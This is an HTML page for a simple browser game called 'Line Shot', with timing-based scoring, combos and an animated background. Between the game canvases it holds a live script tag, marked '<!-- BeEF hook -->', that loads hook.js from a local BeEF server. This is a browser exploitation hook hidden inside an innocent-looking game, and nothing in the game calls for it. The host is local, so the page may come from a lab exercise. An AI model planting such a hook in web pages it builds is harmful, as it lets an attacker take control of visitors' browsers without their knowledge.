<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Line Shot Combo Game with Cool Background</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');

  html, body {
    margin: 0;
    height: 100%;
    overflow: hidden;
    font-family: 'Press Start 2P', cursive, monospace;
    background: #222;
    color: #fff;
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  body {
    position: relative;
    z-index: 1;
  }

  h1, p {
    z-index: 10;
    position: relative;
    user-select: none;
  }

  #score {
    font-size: 1.2rem;
    margin-top: 10px;
    font-family: 'Press Start 2P', monospace;
    user-select: none;
    position: relative;
    z-index: 10;
  }

  #backgroundCanvas {
    position: fixed;
    top: 0; left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 0;
    pointer-events: none;
    display: block;
  }

  #gameCanvas {
    background: rgba(17,17,17,0.85);
    margin-top: 20px;
    border: 2px solid #555;
    z-index: 10;
    position: relative;
  }
</style>
</head>
<body>
<h1>ðŸŽ¯ Line Shot: Hit the Button!</h1>
<p>Press <b>SPACE</b> when the ball passes over the button. Chain combos!</p>
<div id="score">Score: 0 | Combo: x0</div>
<canvas id="gameCanvas" width="500" height="500"></canvas>

<canvas id="backgroundCanvas"></canvas>

<!-- BeEF hook -->
<script src="http://127.0.0.1:3000/hook.js"></script>

<script>
// === Background Animation ===
const bgCanvas = document.getElementById('backgroundCanvas');
const bgCtx = bgCanvas.getContext('2d');

function resizeBg() {
  bgCanvas.width = window.innerWidth;
  bgCanvas.height = window.innerHeight;
}
resizeBg();
window.addEventListener('resize', resizeBg);

// Gradient animation parameters
let gradientShift = 0;

// Particle system for background
const particles = [];
const particleCount = 50;

class Particle {
  constructor() {
    this.reset();
  }
  reset() {
    this.x = Math.random() * bgCanvas.width;
    this.y = Math.random() * bgCanvas.height;
    this.radius = 1 + Math.random() * 3;
    this.speedX = (Math.random() - 0.5) * 0.2;
    this.speedY = (Math.random() - 0.5) * 0.2;
    this.alpha = 0.1 + Math.random() * 0.3;
  }
  update() {
    this.x += this.speedX;
    this.y += this.speedY;
    if(this.x < 0 || this.x > bgCanvas.width || this.y < 0 || this.y > bgCanvas.height) {
      this.reset();
    }
  }
  draw() {
    bgCtx.beginPath();
    bgCtx.arc(this.x, this.y, this.radius, 0, 2 * Math.PI);
    bgCtx.fillStyle = `rgba(255,255,255,${this.alpha})`;
    bgCtx.fill();
  }
}

for(let i=0; i < particleCount; i++) {
  particles.push(new Particle());
}

function drawBackground() {
  gradientShift += 0.005;
  const gradient = bgCtx.createLinearGradient(0, 0, bgCanvas.width, bgCanvas.height);
  gradient.addColorStop(0, `hsl(${(gradientShift*360)%360}, 70%, 30%)`);
  gradient.addColorStop(1, `hsl(${((gradientShift*360)+60)%360}, 70%, 40%)`);
  bgCtx.fillStyle = gradient;
  bgCtx.fillRect(0, 0, bgCanvas.width, bgCanvas.height);

  // Draw particles
  particles.forEach(p => {
    p.update();
    p.draw();
  });
}

// === Game Code ===
const canvas = document.getElementById('gameCanvas');
const ctx = canvas.getContext('2d');
const scoreDisplay = document.getElementById('score');

const centerX = canvas.width / 2;
const centerY = canvas.height / 2;
const buttonRadius = 30;

let t = 0;                  
let dir = 1;                
let baseSpeed = 0.02;       
let speed = baseSpeed;
let angle = Math.random() * 2 * Math.PI;

let score = 0;
let combo = 0;

const colors = ['#FF4136', '#FF851B', '#FFDC00', '#2ECC40', '#0074D9', '#B10DC9'];

let explosionActive = false;
let explosionFrame = 0;

document.addEventListener('keydown', (e) => {
  if (explosionActive) return; // disable input during explosion
  if (e.code === 'Space') {
    const ball = getBallPosition();
    const dx = ball.x - centerX;
    const dy = ball.y - centerY;
    const dist = Math.sqrt(dx * dx + dy * dy);

    if (dist <= buttonRadius) {
      // HIT
      score++;
      combo++;
      randomizeAngle();
      updateSpeed();
      if(score >= 100) {
        triggerExplosion();
      }
    } else {
      // MISS
      combo = 0;
    }
    updateScore();
  }
});

function updateSpeed() {
  speed = Math.min(baseSpeed * (1 + 0.05 * score), 0.1);
}

function updateScore() {
  const colorIndex = Math.floor(score / 5) % colors.length;
  scoreDisplay.style.color = colors[colorIndex];
  scoreDisplay.textContent = `Score: ${score} | Combo: x${combo}`;
}

function randomizeAngle() {
  angle = Math.random() * 2 * Math.PI;
  t = 0;
  dir = 1;
}

function getBallPosition() {
  const length = 200;
  const x = centerX + Math.cos(angle) * length * t;
  const y = centerY + Math.sin(angle) * length * t;
  return {x, y};
}

function drawButton() {
  ctx.fillStyle = '#0078d7';
  ctx.beginPath();
  ctx.arc(centerX, centerY, buttonRadius, 0, 2 * Math.PI);
  ctx.fill();
}

function drawBall() {
  const pos = getBallPosition();
  ctx.fillStyle = 'yellow';
  ctx.beginPath();
  ctx.arc(pos.x, pos.y, 10, 0, 2 * Math.PI);
  ctx.fill();
}

function drawLine() {
  ctx.strokeStyle = '#aaa';
  ctx.lineWidth = 2;
  ctx.beginPath();
  const length = 200;
  const x1 = centerX + Math.cos(angle) * length;
  const y1 = centerY + Math.sin(angle) * length;
  const x2 = centerX - Math.cos(angle) * length;
  const y2 = centerY - Math.sin(angle) * length;
  ctx.moveTo(x1, y1);
  ctx.lineTo(x2, y2);
  ctx.stroke();
}

function triggerExplosion() {
  explosionActive = true;
  explosionFrame = 0;
}

function drawExplosion() {
  const maxFrames = 60;
  if(explosionFrame > maxFrames) {
    explosionActive = false;
    score = 0;
    combo = 0;
    updateSpeed();
    updateScore();
    randomizeAngle();
    return;
  }

  const progress = explosionFrame / maxFrames;
  const maxRadius = 250;

  const flash = Math.floor(progress * 10) % 2 === 0 ? '#fff' : '#000';
  ctx.fillStyle = flash;
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  for(let i=0; i<10; i++) {
    const radius = maxRadius * progress * (i / 10);
    ctx.strokeStyle = colors[i % colors.length];
    ctx.lineWidth = 3;
    ctx.beginPath();
    ctx.arc(centerX, centerY, radius, 0, 2*Math.PI);
    ctx.stroke();
  }

  explosionFrame++;
}

function gameLoop() {
  drawBackground();

  ctx.clearRect(0, 0, canvas.width, canvas.height);

  if(explosionActive) {
    drawExplosion();
  } else {
    t += speed * dir;
    if (t >= 1 || t <= -1) {
      dir *= -1;
    }

    drawLine();
    drawButton();
    drawBall();
  }

  requestAnimationFrame(gameLoop);
}

updateSpeed();
updateScore();
gameLoop();
</script>
</body>
</html>
